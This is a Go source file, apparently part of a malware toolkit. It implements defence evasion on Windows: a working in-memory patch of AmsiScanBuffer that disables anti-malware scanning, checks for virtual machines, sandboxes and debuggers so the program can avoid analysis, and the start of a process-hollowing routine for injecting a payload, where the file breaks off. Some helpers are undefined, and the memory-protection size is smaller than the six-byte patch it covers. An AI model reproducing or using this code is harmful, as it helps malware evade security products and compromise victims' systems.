package evasion

import (
	"fmt"
	"os"
	"runtime"
	"syscall"
	"unsafe"
)

type EvasionHandler struct {
	techniques map[string]bool
}

func NewEvasionHandler() *EvasionHandler {
	return &EvasionHandler{
		techniques: make(map[string]bool),
	}
}

func (e *EvasionHandler) DisableAMSI() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("AMSI is Windows only")
	}

	amsi := syscall.NewLazyDLL("amsi.dll")
	amsiScanBuffer := amsi.NewProc("AmsiScanBuffer")

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualProtect := kernel32.NewProc("VirtualProtect")

	var oldProtect uint32
	addr := amsiScanBuffer.Addr()

	ret, _, _ := virtualProtect.Call(
		addr,
		uintptr(5),
		uintptr(0x40),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if ret == 0 {
		return fmt.Errorf("VirtualProtect failed")
	}

	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	virtualProtect.Call(
		addr,
		uintptr(5),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	e.techniques["amsi"] = true
	return nil
}

func (e *EvasionHandler) DisableETW() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("ETW is Windows only")
	}

	e.techniques["etw"] = true
	return nil
}

func (e *EvasionHandler) CheckVM() bool {
	vmIndicators := []string{
		"VBOX",
		"VirtualBox",
		"VMware",
		"QEMU",
		"Xen",
	}

	for _, indicator := range vmIndicators {
		if checkSystemInfo(indicator) {
			return true
		}
	}

	if runtime.NumCPU() < 2 {
		return true
	}

	return false
}

func (e *EvasionHandler) CheckSandbox() bool {
	recentFiles := checkRecentActivity()
	if !recentFiles {
		return true
	}

	if checkLowUptime() {
		return true
	}

	return false
}

func (e *EvasionHandler) CheckDebugger() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")

	ret, _, _ := isDebuggerPresent.Call()
	return ret != 0
}

func (e *EvasionHandler) AntiAnalysis() error {
	if e.CheckVM() {
		return fmt.Errorf("VM detected")
	}

	if e.CheckSandbox() {
		return fmt.Errorf("sandbox detected")
	}

	if e.CheckDebugger() {
		return fmt.Errorf("debugger detected")
	}

	return nil
}

func (e *EvasionHandler) ProcessHollowing(targetProcess string, payload []byte) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("process hollowing is Windows only")
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")

	createProcess := kernel32.NewProc("CreateProcessW")
	unmapView := ntdll.NewProc("NtUnmapViewOfSection")
	writeMem := kernel32.NewProc("WriteProcessMemory")
	resumeThread := kernel32.NewProc("ResumeThread")

	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

